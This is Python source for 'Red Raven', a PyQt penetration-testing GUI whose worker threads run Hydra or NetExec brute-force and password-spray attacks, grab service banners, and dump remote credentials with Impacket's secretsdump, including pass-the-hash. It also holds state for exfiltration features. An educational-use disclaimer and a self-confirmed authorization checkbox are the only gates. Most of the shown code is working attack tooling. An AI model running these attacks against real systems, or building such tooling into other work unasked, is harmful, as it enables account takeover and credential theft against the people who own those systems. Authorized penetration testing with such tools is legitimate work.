class BruteForceWorker(QThread):
    update_output = pyqtSignal(str)
    update_status = pyqtSignal(str)
    brute_force_finished = pyqtSignal()

    def __init__(self, target_input_text, username, wordlist_content, tool, protocol, authorization_var):
        super().__init__()
        self.target_input_text = target_input_text
        self.username = username
        self.wordlist_content = wordlist_content
        self.tool = tool
        self.protocol = protocol # New: selected protocol
        self.authorization_var = authorization_var
        self._is_running = True
        self._process = None
        self.temp_wordlist_path = None
        self.output_buffer = [] # Buffer for output
        self.buffer_threshold = 20 # Emit after 20 lines

    def _flush_buffer(self):
        if self.output_buffer:
            self.update_output.emit("".join(self.output_buffer))
            self.output_buffer.clear()

    def run(self):
        if not self.authorization_var:
            self.update_output.emit("Authorization required to perform brute force operations.\n")
            self.update_status.emit("Brute force aborted: Authorization missing.")
            self.brute_force_finished.emit()
            return

        self.output_buffer.append(f"--- Starting Brute Force Attack with {self.tool} ({self.protocol}) ---\n")
        self.output_buffer.append(f"Target(s): {self.target_input_text}\n")
        self.output_buffer.append(f"Username: {self.username}\n")
        self._flush_buffer()
        self.update_status.emit(f"Running brute force with {self.tool}...")

        try:
            # Create a temporary wordlist file
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".txt") as temp_f:
                temp_f.write(self.wordlist_content)
                self.temp_wordlist_path = temp_f.name

            command_parts = []
            executable_name = self.tool.lower()

            if self.tool in ["NetExec", "CrackMapExec"]:
                # Changed from -P to -p based on user feedback for flag compatibility.
                # Standard usage often uses -P for password files, but using -p as requested.
                command_parts = [executable_name, self.protocol, self.target_input_text, "-u", self.username, "-p", self.temp_wordlist_path, "--continue-on-success"]
            elif self.tool == "Hydra":
                # Hydra uses -l for single username, -P for password file
                command_parts = ["hydra", "-l", self.username, "-P", self.temp_wordlist_path, self.target_input_text, self.protocol]
            else:
                self.update_output.emit(f"Error: Unsupported tool for brute force: {self.tool}\n")
                self.update_status.emit("Brute force failed: Unsupported tool.")
                self.brute_force_finished.emit()
                return

            self.output_buffer.append(f"  Running command: {' '.join(command_parts)}\n")
            self._flush_buffer()

            self._process = subprocess.Popen(
                command_parts,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                shell=False,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )

            while self._is_running:
                output_line = self._process.stdout.readline()
                if output_line == '' and self._process.poll() is not None:
                    break
                if output_line:
                    self.output_buffer.append(f"  {output_line}")
                    if len(self.output_buffer) >= self.buffer_threshold:
                        self._flush_buffer()
                time.sleep(0.01)

            remaining_stdout, remaining_stderr = self._process.communicate()
            if remaining_stdout:
                self.output_buffer.append(f"  {remaining_stdout}")
            if remaining_stderr:
                self.output_buffer.append(f"  Error:\n  {remaining_stderr}")
            self._flush_buffer()

            if self._is_running:
                return_code = self._process.returncode
                self.update_output.emit(f"\n  Brute force finished with exit code: {return_code}\n")
            else:
                self.update_output.emit(f"\n  Brute force stopped by user.\n")

        except FileNotFoundError:
            self._flush_buffer()
            self.update_output.emit(f"Error: '{executable_name}' command not found. Please ensure {self.tool} is installed and in your system's PATH.\n")
            self.update_status.emit(f"Error: {self.tool} not found.")
        except Exception as e:
            self._flush_buffer()
            self.update_output.emit(f"An error occurred during brute force execution: {e}\n")
            self.update_status.emit(f"Error: {e}")
        finally:
            if self.temp_wordlist_path and os.path.exists(self.temp_wordlist_path):
                os.remove(self.temp_wordlist_path)
            self.brute_force_finished.emit()
            if self._process:
                self._process.wait()
            self._process = None

    def stop(self):
        self._is_running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()

class PasswordSprayWorker(QThread):
    update_output = pyqtSignal(str)
    update_status = pyqtSignal(str)
    password_spray_finished = pyqtSignal()

    def __init__(self, target_input_text, usernames_content, password, tool, protocol, authorization_var):
        super().__init__()
        self.target_input_text = target_input_text
        self.usernames_content = usernames_content
        self.password = password
        self.tool = tool
        self.protocol = protocol # New: selected protocol
        self.authorization_var = authorization_var
        self._is_running = True
        self._process = None
        self.temp_usernames_path = None
        self.output_buffer = [] # Buffer for output
        self.buffer_threshold = 20 # Emit after 20 lines

    def _flush_buffer(self):
        if self.output_buffer:
            self.update_output.emit("".join(self.output_buffer))
            self.output_buffer.clear()

    def run(self):
        if not self.authorization_var:
            self.update_output.emit("Authorization required to perform password spray operations.\n")
            self.update_status.emit("Password spray aborted: Authorization missing.")
            self.password_spray_finished.emit()
            return

        self.output_buffer.append(f"--- Starting Password Spray Attack with {self.tool} ({self.protocol}) ---\n")
        self.output_buffer.append(f"Target(s): {self.target_input_text}\n")
        self.output_buffer.append(f"Password: '{self.password}'\n")
        self._flush_buffer()
        self.update_status.emit(f"Running password spray with {self.tool}...")

        try:
            # Create a temporary usernames file
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".txt") as temp_f:
                temp_f.write(self.usernames_content)
                self.temp_usernames_path = temp_f.name

            command_parts = []
            executable_name = self.tool.lower()

            if self.tool in ["NetExec", "CrackMapExec"]:
                # Changed from -U to -u based on user feedback for flag compatibility.
                # Standard usage often uses -U for username files, but using -u as requested.
                command_parts = [executable_name, self.protocol, self.target_input_text, "-u", self.temp_usernames_path, "-p", self.password]
            elif self.tool == "Hydra":
                # Hydra uses -L for username file, -p for single password
                command_parts = ["hydra", "-L", self.temp_usernames_path, "-p", self.password, self.target_input_text, self.protocol]
            else:
                self.update_output.emit(f"Error: Unsupported tool for password spray: {self.tool}\n")
                self.update_status.emit("Password spray failed: Unsupported tool.")
                self.password_spray_finished.emit()
                return

            self.output_buffer.append(f"  Running command: {' '.join(command_parts)}\n")
            self._flush_buffer()

            self._process = subprocess.Popen(
                command_parts,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                shell=False,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            )

            while self._is_running:
                output_line = self._process.stdout.readline()
                if output_line == '' and self._process.poll() is not None:
                    break
                if output_line:
                    self.output_buffer.append(f"  {output_line}")
                    if len(self.output_buffer) >= self.buffer_threshold:
                        self._flush_buffer()
                time.sleep(0.01)

            remaining_stdout, remaining_stderr = self._process.communicate()
            if remaining_stdout:
                self.output_buffer.append(f"  {remaining_stdout}")
            if remaining_stderr:
                self.output_buffer.append(f"  Error:\n  {remaining_stderr}")
            self._flush_buffer()

            if self._is_running:
                return_code = self._process.returncode
                self.update_output.emit(f"\n  Password spray finished with exit code: {return_code}\n")
            else:
                self.update_output.emit(f"\n  Password spray stopped by user.\n")

        except FileNotFoundError:
            self._flush_buffer()
            self.update_output.emit(f"Error: '{executable_name}' command not found. Please ensure {self.tool} is installed and in your system's PATH.\n")
            self.update_status.emit(f"Error: {self.tool} not found.")
        except Exception as e:
            self._flush_buffer()
            self.update_output.emit(f"An error occurred during password spray execution: {e}\n")
            self.update_status.emit(f"Error: {e}")
        finally:
            if self.temp_usernames_path and os.path.exists(self.temp_usernames_path):
                os.remove(self.temp_usernames_path)
            self.password_spray_finished.emit()
            if self._process:
                self._process.wait()
            self._process = None

    def stop(self):
        self._is_running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()

class BannerGrabbingWorker(QThread):
    update_status = pyqtSignal(str)
    grab_finished = pyqtSignal()
    data_available = pyqtSignal() # New signal for queue data

    TIMEOUT = 3 # Socket timeout for connection attempts

    def __init__(self, target_ip_port_list, authorization_var):
        super().__init__()
        self.target_ip_port_list = target_ip_port_list # List of (ip, port) tuples
        self.authorization_var = authorization_var
        self._is_running = True
        self.results_queue = Queue() # Thread-safe queue for results to GUI

    def _grab_banner_from_socket(self, host, port):
        """Attempts to connect to a single port and grab its banner."""
        if not self._is_running:
            return

        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.TIMEOUT)

            self.results_queue.put(f"  Attempting to connect to {host}:{port}...\n")
            self.data_available.emit()
            sock.connect((host, port))
            self.results_queue.put(f"  Successfully connected to {host}:{port}.\n")
            self.data_available.emit()

            # Send common service requests if applicable
            if port == 80: # HTTP
                request = b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n"
                sock.sendall(request)
                self.results_queue.put("  Sent HTTP GET request.\n")
                self.data_available.emit()
            elif port == 21: # FTP
                pass # FTP server usually sends banner on connect
            elif port == 22: # SSH
                pass # SSH server usually sends banner on connect
            elif port == 23: # Telnet
                pass # Telnet server usually sends banner on connect
            else:
                self.results_queue.put("  No specific request sent for this port type.\n")
                self.data_available.emit()

            banner_data = b""
            while self._is_running:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    banner_data += data
                    # Emit data as it comes in, but limit frequency for large banners
                    self.results_queue.put(data.decode(errors='ignore'))
                    self.data_available.emit()
                    # For immediate feedback, break after first chunk for non-HTTP
                    if len(banner_data) > 0 and port != 80:
                        break
                except socket.timeout:
                    self.results_queue.put("  Socket timed out during data reception.\n")
                    self.data_available.emit()
                    break
                except Exception as e:
                    self.results_queue.put(f"  Error during data reception: {e}\n")
                    self.data_available.emit()
                    break

            if self._is_running:
                if banner_data:
                    self.results_queue.put(f"\n  --- Banner Received from {host}:{port} ({len(banner_data)} bytes) ---\n")
                    # The actual banner content was already emitted in chunks above
                    self.results_queue.put("\n  --- End of Banner ---\n")
                else:
                    self.results_queue.put(f"\n  No banner or data received from {host}:{port}.\n")
            else:
                self.results_queue.put(f"\n--- Banner Grabbing Stopped by User for {host}:{port} ---\n")

        except socket.timeout:
            self.results_queue.put(f"  Error: Connection to {host}:{port} timed out.\n")
        except ConnectionRefusedError:
            self.results_queue.put(f"  Error: Connection to {host}:{port} refused by target.\n")
        except socket.gaierror:
            self.results_queue.put(f"  Error: Hostname '{host}' could not be resolved.\n")
        except ValueError:
            self.results_queue.put(f"  Error: Invalid port number '{port}'.\n")
        except Exception as e:
            self.results_queue.put(f"An unexpected error occurred for {host}:{port}: {e}\n")
        finally:
            if sock:
                sock.close()
            self.data_available.emit() # Ensure signal is emitted for final messages

    def run(self):
        if not self.authorization_var:
            self.results_queue.put("Authorization required to perform banner grabbing.\n")
            self.update_status.emit("Banner grabbing aborted: Authorization missing.")
            self.grab_finished.emit()
            self.data_available.emit()
            return

        self.results_queue.put("=" * 50 + "\n")
        self.results_queue.put("BANNER GRABBING\n")
        self.results_queue.put("=" * 50 + "\n")
        self.data_available.emit()

        if not self.target_ip_port_list:
            self.results_queue.put("No valid targets (IP:Port) to scan.\n")
            self.update_status.emit("Banner grabbing finished (no targets).")
            self.grab_finished.emit()
            self.data_available.emit()
            return

        self.results_queue.put(f"[+] Total targets: {len(self.target_ip_port_list)}\n")
        self.results_queue.put(f"[+] Grabbing started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self.results_queue.put("=" * 50 + "\n\n")
        self.data_available.emit()
        self.update_status.emit("Grabbing banners...")

        for ip, port in self.target_ip_port_list:
            if not self._is_running:
                break
            self.results_queue.put(f"\n--- Grabbing Banner from {ip}:{port} ---\n")
            self.data_available.emit()
            self.update_status.emit(f"Grabbing {ip}:{port}...")
            self._grab_banner_from_socket(ip, port)
            if not self._is_running:
                break
            self.results_queue.put("\n" + "="*50 + "\n")
            self.data_available.emit()


        if self._is_running:
            self.results_queue.put("\n--- Banner Grabbing Completed ---\n")
            self.update_status.emit("Banner grabbing completed.")
        else:
            self.results_queue.put("\n--- Banner Grabbing Stopped by User ---\n")
            self.update_status.emit("Banner grabbing stopped.")
        self.data_available.emit()

        self.grab_finished.emit()

    def stop(self):
        self._is_running = False
        # No subprocess to terminate here as it's a socket operation
        # The socket will close automatically or due to timeout/error

class SecretsdumpWorker(QThread): # Renamed from MimikatzWorker
    update_output = pyqtSignal(str)
    update_status = pyqtSignal(str)
    secretsdump_finished = pyqtSignal() # Renamed signal

    def __init__(self, target_ip, username, password, domain, use_hashes, additional_options, authorization_var):
        super().__init__()
        self.target_ip = target_ip
        self.username = username
        self.password = password
        self.domain = domain
        self.use_hashes = use_hashes
        self.additional_options = additional_options
        self.authorization_var = authorization_var
        self._is_running = True
        self._process = None
        self.output_buffer = [] # Buffer for output
        self.buffer_threshold = 20 # Emit after 20 lines

    def _flush_buffer(self):
        if self.output_buffer:
            self.update_output.emit("".join(self.output_buffer))
            self.output_buffer.clear()

    def run(self):
        if not self.authorization_var:
            self.update_output.emit("Authorization required to perform password dumping.\n")
            self.update_status.emit("Password dumping aborted: Authorization missing.")
            self.secretsdump_finished.emit()
            return

        command_parts = ["secretsdump.py"]

        # Construct authentication part
        auth_string = ""
        if self.domain:
            auth_string += f"{self.domain}/"
        auth_string += self.username

        if self.use_hashes:
            if not self.password:
                self.update_output.emit("Error: Hash value is required when 'Use Hashes' is checked.\n")
                self.update_status.emit("Password dumping failed: Missing hash.")
                self.secretsdump_finished.emit()
                return
            command_parts.extend(["-hashes", self.password])
            auth_string += f"@{self.target_ip}"
        else:
            if not self.password:
                self.update_output.emit("Error: Password is required when 'Use Hashes' is not checked.\n")
                self.update_status.emit("Password dumping failed: Missing password.")
                self.secretsdump_finished.emit()
                return
            auth_string += f":{self.password}@{self.target_ip}"

        command_parts.append(auth_string)

        # Add additional options
        if self.additional_options:
            command_parts.extend(shlex.split(self.additional_options))

        self.output_buffer.append(f"--- Starting secretsdump.py ---\n")
        self.output_buffer.append(f"Command: {' '.join(command_parts)}\n\n")
        self._flush_buffer()
        self.update_status.emit("Running secretsdump.py...")

        try:
            # Use shell=False and pass command as list for robustness
            self._process = subprocess.Popen(command_parts, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=False)
            while self._is_running:
                if self._process.poll() is not None:
                    break
                output_line = self._process.stdout.readline()
                if output_line:
                    self.output_buffer.append(output_line)
                    if len(self.output_buffer) >= self.buffer_threshold:
                        self._flush_buffer()
                time.sleep(0.01)

            stdout, stderr = self._process.communicate()
            if stdout:
                self.output_buffer.append(stdout)
            if stderr:
                self.output_buffer.append(f"\n--- Error Output ---\n{stderr}\n")

            self._flush_buffer() # Flush any remaining output
            return_code = self._process.returncode
            self.update_output.emit(f"\n--- secretsdump.py Finished with Return Code: {return_code} ---\n")
            self.update_status.emit(f"secretsdump.py finished (code: {return_code}).")

        except FileNotFoundError:
            self._flush_buffer()
            self.update_output.emit(f"Error: 'secretsdump.py' command not found.\nEnsure Impacket is installed and 'secretsdump.py' is in your system's PATH.\n")
            self.update_status.emit("Error: secretsdump.py not found.")
        except Exception as e:
            self._flush_buffer()
            self.update_output.emit(f"An error occurred: {e}\n")
            self.update_status.emit(f"Error: {e}")
        finally:
            self.secretsdump_finished.emit()
            if self._process:
                self._process.wait()
            self._process = None

    def stop(self):
        self._is_running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()

# --- Main Application Class (QMainWindow) ---
class NetworkPenTestTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Red Raven") # Updated Window Title
        # Initial geometry set here for the main window, this will be overridden by resize in init_ui
        self.setGeometry(100, 100, 1000, 750)

        # State variables for running operations
        self.scanning = False
        self.netexec_running = False
        self.exfil_running = False
        self.brute_force_running = False
        self.password_spray_running = False
        self.banner_grabbing_running = False
        self.password_dumping_running = False
        self.network_discovery_running = False
        self._resizing = False # For custom window resizing
        self._resize_edge = None # For custom window resizing
        self._original_mouse_pos = QPoint() # For custom window resizing
        self._original_geometry = self.geometry() # For custom window resizing
        self._resize_edge_margin = 5 # Pixels from edge to detect resize

        # Initialize worker references to None
        self.scan_worker = None
        self.network_discovery_worker = None
        self.netexec_worker = None
        self.brute_force_worker = None
        self.password_spray_worker = None
        self.banner_grab_worker = None
        self.secretsdump_worker = None
        self.dummy_file_worker = None
        self.exfil_worker = None
        self.exfil_server_worker = None # This one should persist across tab changes if started

        # Initialize UI element references to None to prevent AttributeError on early access
        # These will be assigned in _create_*_widgets methods
        self.scan_button = None
        self.stop_button = None
        self.start_network_discovery_button = None
        self.stop_network_discovery_button = None
        self.run_netexec_button = None
        self.stop_netexec_button = None
        self.start_brute_force_button = None
        self.stop_brute_force_button = None
        self.start_password_spray_button = None
        self.stop_password_spray_button = None
        self.start_banner_grab_button = None
        self.stop_banner_grab_button = None
        self.start_password_dump_button = None
        self.stop_password_dump_button = None
        self.create_dummy_button = None
        self.perform_exfil_button = None
        self.start_server_button = None
        self.stop_server_button = None
        self.authorization_checkbox = None
        self.status_bar = None

        self.dummy_file_path = "dummy_200MB_file.bin"
        self.dummy_file_size_mb = 200
        self.authorization_checked = False
        self.exfil_uploaded_file_path = None # New attribute for uploaded exfil file

        self.rockyou_wordlist_path = "rockyou.txt"
        self._create_dummy_rockyou_file()

        # New attribute for brute force uploaded wordlist path - Initialized to None
        self.brute_force_wordlist_file_path = None
        # New attribute for password spray uploaded usernames path - Initialized to None
        self.password_spray_usernames_file_path = None

        # --- IMPORTANT FIX: Initialize QTimer instances here ---
        # These MUST be initialized directly in __init__ as they are used in stop_all_workers
        # which can be called early in the lifecycle.
        self.port_scan_results_timer = QTimer(self)
        self.banner_grab_results_timer = QTimer(self)
        # --- END IMPORTANT FIX ---

        self.init_ui()

        # Connect the global signals object to the GUI slot
        exfil_server_signals.update_output.connect(self.update_exfil_output)

        # Setup timer for port scan results processing
        self.port_scan_results_timer.setInterval(50) # Update every 50 milliseconds (reduced from 100)
        self.port_scan_results_timer.timeout.connect(self._process_scan_results_from_queue)

        # Setup timer for banner grabbing results processing
        self.banner_grab_results_timer.setInterval(50) # Update every 50 milliseconds
        self.banner_grab_results_timer.timeout.connect(self._process_banner_grab_results_from_queue)

        # Set the window to accept mouse tracking events even without a button pressed
        self.setMouseTracking(True)


    # --- Custom Window Resizing Methods ---
    def mousePressEvent(self, event):
        """
        Handles mouse press events for custom window resizing.
        """
        if event.button() == Qt.MouseButton.LeftButton:
            # Determine if the press was on a resizable edge
            edge = self._get_resize_edge(event.pos())
            if edge:
                self._resizing = True
                self._resize_edge = edge
                # Store global mouse position and original window geometry
                self._original_mouse_pos = event.globalPosition().toPoint()
                self._original_geometry = self.geometry()
        super().mousePressEvent(event)

    def mouseMoveEvent(self, event):
        """
        Handles mouse move events for custom window resizing and cursor changes.
        """
        if self._resizing:
            # Calculate the change in Y position
            delta_y = int(event.globalPosition().y() - self._original_mouse_pos.y())
            
            # Get original window dimensions
            original_x = self._original_geometry.x()
            original_y = self._original_geometry.y()
            original_width = self._original_geometry.width()
            original_height = self._original_geometry.height()

            new_x = original_x
            new_y = original_y
            new_width = original_width
            new_height = original_height

            if self._resize_edge == "bottom":
                # Resizing from the bottom: only height changes
                new_height = original_height + delta_y
            elif self._resize_edge == "top":
                # Resizing from the top: Y position and height change
                new_y = original_y + delta_y
                new_height = original_height - delta_y

            # Ensure minimum height
            min_height = 200 # Set a reasonable minimum height for the window
            if new_height < min_height:
                new_height = min_height
                # If resizing from top and hit min_height, adjust Y back
                if self._resize_edge == "top":
                    new_y = original_y + (original_height - min_height)

            # Apply the new geometry
            self.setGeometry(new_x, new_y, new_width, new_height)
        else:
            # If not resizing, change cursor based on hover over resizeable edges
            edge = self._get_resize_edge(event.pos())
            if edge in ["top", "bottom"]:
                self.setCursor(Qt.CursorShape.SizeVerCursor) # Vertical resize cursor
            else:
                self.setCursor(Qt.CursorShape.ArrowCursor) # Default arrow cursor
        super().mouseMoveEvent(event)

    def mouseReleaseEvent(self, event):
        """
        Handles mouse release events, ending the custom resizing operation.
        """
        if event.button() == Qt.MouseButton.LeftButton and self._resizing:
            self._resizing = False
            self._resize_edge = None
            self.setCursor(Qt.CursorShape.ArrowCursor) # Reset cursor
        super().mouseReleaseEvent(event)

    def _get_resize_edge(self, pos: QPoint):
        """
        Helper method to determine if the mouse position is near a resizable edge.
        Returns "top", "bottom", or None.
        """
        rect = self.rect()
        # Check top edge
        if abs(pos.y() - rect.top()) <= self._resize_edge_margin:
            return "top"
        # Check bottom edge
        elif abs(pos.y() - rect.bottom()) <= self._resize_edge_margin:
            return "bottom"
        return None


    def _create_dummy_rockyou_file(self):
        """Creates a small dummy rockyou.txt file if it doesn't exist."""
        if not os.path.exists(self.rockyou_wordlist_path):
            try:
                with open(self.rockyou_wordlist_path, "w") as f:
                    f.write("password\n")
                    f.write("123456\n")
                    f.write("admin\n")
                    f.write("secret\n")
                    f.write("qwerty\n")
                    f.write("password123\n")
            except Exception as e:
                print(f"Error creating dummy rockyou.txt: {e}")

    def update_authorization_state(self):
        # Ensure authorization_checkbox is initialized before accessing it
        if self.authorization_checkbox:
            self.authorization_checked = self.authorization_checkbox.isChecked()

    def show_message_box(self, title, message, icon=QMessageBox.Icon.Information):
        msg_box = QMessageBox(self)
        msg_box.setIcon(icon)
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        msg_box.setStandardButtons(QMessageBox.StandardButton.Ok)
        msg_box.setStyleSheet(f"QMessageBox {{ background-color: {self.dark_bg_color.name()}; }}"
                              f"QMessageBox QLabel {{ color: {self.green_text_color.name()}; }}"
                              f"QMessageBox QPushButton {{ background-color: {QColor('#2ECC71').name()}; color: {self.dark_bg_color.name()}; border-radius: 5px; padding: 5px 10px; }}" # Green for Ok
                              f"QMessageBox QPushButton:hover {{ background-color: {QColor('#27AE60').name()}; }}")
        return msg_box.exec()

    def show_confirm_box(self, title, message):
        msg_box = QMessageBox(self)
        msg_box.setIcon(QMessageBox.Icon.Question)
        msg_box.setWindowTitle(title)
        msg_box.setText(message)
        msg_box.setStandardButtons(QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        msg_box.setDefaultButton(QMessageBox.StandardButton.No)
        msg_box.setStyleSheet(f"QMessageBox {{ background-color: {self.dark_bg_color.name()}; }}"
                              f"QMessageBox QLabel {{ color: {self.green_text_color.name()}; }}"
                              f"QMessageBox QPushButton[text=\"&Yes\"] {{ background-color: {QColor('#2ECC71').name()}; color: {self.dark_bg_color.name()}; border-radius: 5px; padding: 5px 10px; }}" # Yes button green
                              f"QMessageBox QPushButton[text=\"&Yes\"]:hover {{ background-color: {QColor('#27AE60').name()}; }}"
                              f"QMessageBox QPushButton[text=\"&No\"] {{ background-color: {QColor('#E74C3C').name()}; color: {self.dark_bg_color.name()}; border-radius: 5px; padding: 5px 10px; }}" # No button red
                              f"QMessageBox QPushButton[text=\"&No\"]:hover {{ background-color: {QColor('#C0392B').name()}; }}")
        return msg_box.exec() == QMessageBox.StandardButton.Yes

    def init_ui(self):
        # Set initial window size for better cross-platform behavior and resizability
        self.resize(1024, 768) # Set a reasonable initial size
        self.setMinimumSize(800, 600) # Set a minimum size to prevent content from being too cramped

        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)
        self.main_layout.setContentsMargins(15, 15, 15, 15)
        self.main_layout.setSpacing(15)

        self.green_text_color = QColor("#00FF00")
        self.dark_bg_color = QColor("#2C3E50")
        self.medium_bg_color = QColor("#34495E")
        self.input_bg_color = QColor("#4A627A")
        self.orange_color = QColor("#FFA500")
        self.red_raven_color = QColor("#E74C3C") # Specific red for Red Raven title

        palette = self.palette()
        palette.setColor(QPalette.ColorRole.WindowText, self.green_text_color)
        palette.setColor(QPalette.ColorRole.Text, self.green_text_color)
        palette.setColor(QPalette.ColorRole.Base, self.input_bg_color)
        palette.setColor(QPalette.ColorRole.Highlight, QColor("#1ABC9C"))
        self.setPalette(palette)

        # --- Updated Stylesheet for Red/Green Buttons ---
        self.setStyleSheet(f"QMainWindow {{ background-color: {self.dark_bg_color.name()}; }}"
                           f"QFrame {{ background-color: {self.medium_bg_color.name()}; border-radius: 8px; }}"
                           f"QLabel {{ color: {self.green_text_color.name()}; }}"
                           f"QLabel#creditLabel {{ color: {self.orange_color.name()}; }}"
                           f"QLabel#disclaimerLabel {{ padding: 10px; }}" # Increased padding
                           f"QLabel#redRavenTitle {{ color: {self.red_raven_color.name()}; }}" # Style for Red Raven title
                           f"QLabel#ravenIconLabel {{ color: {self.red_raven_color.name()}; }}" # Style for the raven emoji
                           f"QLineEdit {{ background-color: {self.input_bg_color.name()}; color: {self.green_text_color.name()}; border: 1px solid {self.medium_bg_color.name()}; border-radius: 5px; padding: 5px; }}"
                           f"QTextEdit {{ background-color: {self.input_bg_color.name()}; color: {self.green_text_color.name()}; border: 1px solid {self.medium_bg_color.name()}; border-radius: 5px; padding: 5px; }}"
                           f"QComboBox {{ background-color: {self.input_bg_color.name()}; color: {self.green_text_color.name()}; border: 1px solid {self.medium_bg_color.name()}; border-radius: 5px; padding: 5px; }}"
                           f"QComboBox::drop-down {{ border-left-width: 1px; border-left-color: {self.medium_bg_color.name()}; border-left-style: solid; }}"
                           f"QComboBox QAbstractItemView {{ background-color: {self.input_bg_color.name()}; color: {self.green_text_color.name()}; selection-background-color: {QColor('#1ABC9C').name()}; }}"
                           f"QCheckBox {{ color: {self.green_text_color.name()}; }}"
                           f"QCheckBox::indicator {{ background-color: {self.medium_bg_color.name()}; border: 1px solid {self.green_text_color.name()}; border-radius: 3px; }}"
                           f"QCheckBox::indicator:checked {{ background-color: {QColor('#1ABC9C').name()}; }}"
                           f"QProgressBar {{ text-align: center; color: {self.green_text_color.name()}; background-color: {self.medium_bg_color.name()}; border-radius: 5px; border: 1px solid {self.green_text_color.name()}; }}"
                           f"QProgressBar::chunk {{ background-color: {QColor('#2ECC71').name()}; border-radius: 5px; }}"
                           f"QTabWidget::pane {{ border: 1px solid {self.medium_bg_color.name()}; background-color: {self.dark_bg_color.name()}; border-radius: 8px; }}"
                           f"QTabBar::tab {{ background: {self.medium_bg_color.name()}; color: {self.green_text_color.name()}; padding: 10px; border-top-left-radius: 8px; border-top-right-radius: 8px; margin-right: 2px; }}"
                           f"QTabBar::tab:selected {{ background: {self.dark_bg_color.name()}; color: {self.green_text_color.name()}; border-bottom-color: {self.dark_bg_color.name()}; }}"

                           # Default button style (green for actions)
                           f"QPushButton {{ background-color: {QColor('#2ECC71').name()}; color: {self.dark_bg_color.name()}; font-weight: bold; border-radius: 8px; padding: 10px 20px; }}"
                           f"QPushButton:hover {{ background-color: {QColor('#27AE60').name()}; }}"

                           # Specific stop button style (red)
                           f"QPushButton#stopButton {{ background-color: {QColor('#E74C3C').name()}; }}"
                           f"QPushButton#stopButton:hover {{ background-color: {QColor('#C0392B').name()}; }}"

                           # Ensure other action buttons inherit the default green or are explicitly set if needed
                           # (Removed individual overrides for these as they now inherit the general QPushButton style)
                          )

        # --- Header Frame ---
        header_frame = QFrame(self)
        header_frame.setFrameShape(QFrame.Shape.NoFrame)
        header_frame.setContentsMargins(20, 20, 20, 20)
        header_layout = QVBoxLayout(header_frame)
        header_layout.setAlignment(Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignHCenter) # Centered horizontally

        # Add a small stretch at the very top to push content down slightly
        header_layout.addStretch(1)

        disclaimer_text = ("Disclaimer: This tool is for educational purposes only. Unauthorized activities are illegal and unethical.")
        disclaimer_label = QLabel(disclaimer_text)
        disclaimer_label.setObjectName("disclaimerLabel")
        disclaimer_font = QFont("Arial", 11)
        disclaimer_label.setFont(disclaimer_font)
        disclaimer_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        disclaimer_label.setWordWrap(True)
        header_layout.addWidget(disclaimer_label)

        # Removed intermediate stretch here to allow disclaimer more space

        # Title and Icon Layout - Centered
        title_icon_layout = QHBoxLayout()
        title_icon_layout.setAlignment(Qt.AlignmentFlag.AlignCenter) # Ensures content within this layout is centered

        # --- Red Raven Icon (Image) ---
        self.raven_icon_label = QLabel()
        # Attempt to load "Raven.png", scale it, and set it.
        # If "Raven.png" is not found, it will fall back to a placeholder text.
        raven_pixmap = QPixmap("assets/Raven.png")
        if raven_pixmap.isNull():
            self.raven_icon_label.setText("[RAVEN]") # Placeholder text if image not found
            self.raven_icon_label.setFont(QFont("Arial", 32)) # Set font for placeholder
            self.raven_icon_label.setStyleSheet(f"QLabel#ravenIconLabel {{ color: {self.red_raven_color.name()}; }}")
        else:
            self.raven_icon_label.setPixmap(raven_pixmap.scaledToHeight(62, Qt.TransformationMode.SmoothTransformation)) # Adjust height as needed, smooth transformation for better quality
            self.raven_icon_label.setObjectName("ravenIconLabel") # Object name for specific styling if image is loaded

        title_icon_layout.addWidget(self.raven_icon_label)

        title_label = QLabel("<b>Red Raven</b>")
        title_label.setObjectName("redRavenTitle") # Object name for specific styling
        title_font = QFont("Arial", 28, QFont.Weight.Bold)
        title_label.setFont(title_font)
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)

        title_icon_layout.addWidget(title_label)

        header_layout.addLayout(title_icon_layout)

        # Credit label below the title
        credit_label_below_title = QLabel("Tool by CyberJump (Sharat)")
        credit_label_below_title.setObjectName("creditLabel")
        credit_label_below_title.setFont(QFont("Arial", 11, QFont.Weight.Bold, italic=True))
        credit_label_below_title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header_layout.addWidget(credit_label_below_title)

        self.authorization_checkbox = QCheckBox("I confirm I have explicit authorization to scan and interact with this network.")
        self.authorization_checkbox.setFont(QFont("Arial", 12))
        self.authorization_checkbox.stateChanged.connect(self.update_authorization_state)
        header_layout.addWidget(self.authorization_checkbox, alignment=Qt.AlignmentFlag.AlignCenter)

        # External Tools Info Label - Set a fixed width to control text wrapping
        self.external_tools_info_label = QLabel(
            "Note: Ensure NMAP, NetExec, Hydra, Impacket, and Scapy are installed and in your system's PATH/environment for full functionality."
        )
        self.external_tools_info_label.setObjectName("external_tools_info_label")
        self.external_tools_info_label.setFont(QFont("Arial", 10))
